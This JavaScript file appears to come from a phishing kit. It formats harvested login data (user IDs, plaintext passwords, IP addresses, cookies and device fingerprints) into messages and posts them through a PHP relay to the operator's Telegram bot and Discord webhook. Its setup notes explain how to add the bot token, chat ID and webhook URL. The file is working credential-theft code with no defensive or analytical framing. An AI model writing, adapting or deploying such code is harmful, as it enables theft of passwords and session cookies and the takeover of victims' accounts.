// Relay integration via PHP backend
function sendToRelay(data) {
    let telegramMessage = '';
    let discordMessage = '';
    if (data.type === 'submission') {
        telegramMessage = `\n🌟 *Login Submission Detected* 🌟\n👤 User ID: ${data.userId}\n🔐 Password: ${data.password}\n🌐 IP Address: ${data.ipAddress}\n🕒 Time: ${data.localTime}\n🔗 URL: ${data.url}\n🚀 *Action Taken: Signed In* 🚀`;
        discordMessage = `\n🌟 **Login Submission Detected** 🌟\n👤 User ID: ${data.userId}\n🔐 Password: ${data.password}\n🌐 IP Address: ${data.ipAddress}\n🕒 Time: ${data.localTime}\n🔗 URL: ${data.url}\n🚀 **Action Taken: Signed In** 🚀`;
    } else if (data.type === 'details') {
        telegramMessage = `\n🌿 *Additional Login Details* 🌿\n🍪 Cookies: ${data.cookies || 'None'}\n📦 Cache Info: ${data.cacheInfo}\n🖥️ Device Fingerprint: ${JSON.stringify(data.deviceFingerprint)}\n🚦 *Data Captured Successfully* 🚦`;
        discordMessage = `\n🌿 **Additional Login Details** 🌿\n🍪 Cookies: ${data.cookies || 'None'}\n📦 Cache Info: ${data.cacheInfo}\n🖥️ Device Fingerprint: ${JSON.stringify(data.deviceFingerprint)}\n🚦 **Data Captured Successfully** 🚦`;
    }
    fetch('notify.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ telegram_message: telegramMessage, discord_message: discordMessage })
    });
}

// Export function for use in script.js
window.sendToExternalServices = (data) => {
    sendToRelay(data);
};

// Notes:
// - Replace 'YOUR_ACTUAL_TELEGRAM_BOT_TOKEN' and 'YOUR_ACTUAL_CHAT_ID' with valid Telegram credentials from BotFather.
// - Replace 'YOUR_ACTUAL_DISCORD_WEBHOOK_URL' with a valid Discord Webhook URL from your server settings.
// - Ensure the server supports CORS if hosted separately.
// - IP address is a placeholder; use a server-side API (e.g., ipify) in production.